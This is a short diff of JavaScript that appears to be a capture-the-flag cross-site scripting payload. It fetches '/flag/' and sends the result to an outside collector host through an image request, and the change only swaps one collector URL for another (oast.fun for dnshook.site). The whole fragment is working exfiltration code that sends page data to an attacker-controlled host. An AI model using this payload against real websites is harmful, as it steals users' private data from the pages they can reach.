@@ -7,7 +7,7 @@ fetch('/flag/')
         }
     })
     .then(flag_content => {
-        const ATTACKER_URL = 'http://tuiocfqssccsdgoxeizs8p0lqpjhoizn4.oast.fun/';
+        const ATTACKER_URL = 'http://590766f5-e0d3-4823-96ff-0ceb2cfa015f.dnshook.site/';
         new Image().src = ATTACKER_URL + '?flag=' + encodeURIComponent(flag_content);
     })
     .catch(error => {
